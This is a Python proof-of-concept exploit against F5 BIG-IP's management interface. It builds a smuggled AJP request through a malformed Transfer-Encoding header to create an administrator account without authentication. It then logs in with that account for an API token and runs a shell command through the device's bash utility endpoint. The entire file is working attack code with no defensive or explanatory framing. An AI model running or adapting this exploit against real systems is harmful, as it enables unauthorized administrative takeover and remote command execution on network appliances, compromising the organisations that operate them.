import argparse
import binascii
import json
import random
import time
import urllib3
import requests
import base64
from urllib3.exceptions import InsecureRequestWarning
import warnings

def generatesth(num):
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(charset) for _ in range(num))

def encode_ajp_string(s):
    if(s == '\xff\xff'):
        return b'\xff\xff'

    length_bytes = len(s).to_bytes(2, byteorder='big')
    encoded_bytes = s.encode()
    end_byte = b'\x00'
    return length_bytes + encoded_bytes + end_byte

def ajp_smuggle_packet(protocol='HTTP/1.1',req_uri='',remote_addr='127.0.0.1',

    remote_host='localhost',server_name='localhost',server_port=80,is_ssl=False,headers={},user = '22222',passwd = '111111111111'):
    
    ajp_packet = b''
    ajp_packet += encode_ajp_string(protocol)
    ajp_packet += encode_ajp_string(req_uri)
    ajp_packet += encode_ajp_string(remote_addr)
    ajp_packet += encode_ajp_string(remote_host)
    ajp_packet += encode_ajp_string(server_name)
    ajp_packet += server_port.to_bytes(2, byteorder='big')
    ajp_packet += is_ssl.to_bytes(1,byteorder='big')

    #headers
    ajp_packet += (len(headers) + 1).to_bytes(2, byteorder='big')
    for key,value in headers.items():
        ajp_packet += encode_ajp_string(key)
        ajp_packet += encode_ajp_string(value)
    
    #host
    ajp_packet += b'\xA0\x0b'
    ajp_packet += encode_ajp_string('localhost')

    #attributes

    #remote_user
    ajp_packet += b'\x03'
    ajp_packet += encode_ajp_string('admin')
    #query_string
    ajp_packet += b'\x05'
    ajp_packet += encode_ajp_string('_timenow=a&_timenow_before=&handler=%2ftmui%2fsystem%2fuser%2fcreate&&&form_page=%2ftmui%2fsystem%2fuser%2fcreate.jsp%3f&form_page_before=&hideObjList=&_bufvalue=eIL4RUnSwXYoPUIOGcOFx2o00Xc%3d&_bufvalue_before=&systemuser-hidden=[["Administrator","[All]"]]&systemuser-hidden_before=&name=' + user + '&name_before=&passwd=' + passwd + '&passwd_before=&finished=x&finished_before=')
    
    #EOF
    ajp_packet += b'\xff\x00'
    return b'204\r\n' +  ajp_packet + b'\r\n0\r\n\r\n'


def unauth_create_user(target,ajp_pak):
    url = f"{target}/tmui/login.jsp"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "a, chunked"
    }
    resp = requests.post(url = url, headers = headers, data = ajp_pak, verify = False)
    if resp.status_code == 200:
        return True
    else:
        return False

def get_token(target,user,passwd):
    # POST /mgmt/shared/authn/login HTTP/1.1
    # Host: 192.168.50.137
    # Content-Type: application/json;charset=UTF-8

    # {"username":"{username}", "password":"{password}"}
    url = f"{target}/mgmt/shared/authn/login"
    headers = {
        "Content-Type" : "application/json;charset=UTF-8",
    }
    burp_json = {"username":user, "password":passwd}
    resp = requests.post(url = url, headers = headers,json = burp_json,verify = False)
    token = json.loads(resp.content.decode())["token"]["token"]
    if token:
        print(f"\033[92m[*]Get_token:{token}.\033[0m")
        return token
    else:
        print(f"\033[94m[-]Failed to get token.\033[0m")
        exit(0)

def exploit(target,token):
    url = f"{target}/mgmt/tm/util/bash"
    headers = {
        "Content-Type" : "application/json;charset=UTF-8",
        "X-F5-Auth-Token" : token
    }
    burp_json = {"command":"run","utilCmdArgs":"-c id"}
    resp = requests.post(url = url, headers = headers, verify = False, json = burp_json)
    print(resp.text)

def flash_user(target,user,passwd):
    # PATCH /mgmt/shared/authz/users/{username} HTTP/1.1
    # Host: 192.168.50.137
    # Content-Type: application/json;charset=UTF-8
    # Authorization: Basic b3BwcGk6c2EweGdydGpkY29o
    # Content-Length: 60

    # {"oldPassword": "{password}", "password": "{password}" }
    time.sleep(5) #flash
    url = f"{target}/mgmt/shared/authz/users/{user}"
    headers = {
        "Content-Type" : "application/json;charset=UTF-8",
        "Authorization" : ("Basic " +  base64.b64encode((f"{user}:{passwd}").encode()).decode())
    }
    burp_json = {"oldPassword": passwd, "password": passwd }
    resp = requests.patch(url = url,headers = headers,verify = False, json = burp_json)
    print(resp.text)

if __name__ == "__main__":
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
    req_uri = '/tmui/Control/form'
    target = 'https://192.168.50.137:443'
    user = generatesth(5)
    passwd = generatesth(12)
    headers ={
        "Tmui-Dubbuf" : "BBBBBBBBBBB",
        "REMOTEROLE"  : "0"
    }
    ajp_pak = ajp_smuggle_packet(req_uri = req_uri,headers = headers,user = user,passwd = passwd)
    if unauth_create_user(target,ajp_pak):
       print(f"\033[0;32;40m[+]Unauth user:Username:{user},passwd:{passwd}.\033[0m")
    else:
       print(f"\033[94m[-]Failed to create unauth user.\033[0m")
       exit(0)
    flash_user(target,user,passwd)
    token = get_token(target,user,passwd)
    exploit(target,token)
